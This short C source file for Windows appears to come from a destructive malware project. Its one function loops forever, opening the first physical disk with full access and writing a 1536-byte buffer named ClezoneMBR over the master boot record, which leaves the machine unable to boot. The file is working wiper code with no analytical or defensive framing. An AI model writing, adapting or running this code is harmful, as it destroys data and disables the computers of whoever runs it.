#include <Windows.h>
#include "MBROverwriter.h"
#include "MBRDefinition.h"

DWORD WINAPI OverwriteMBR(LPVOID lpThread) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, ClezoneMBR, 1536, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}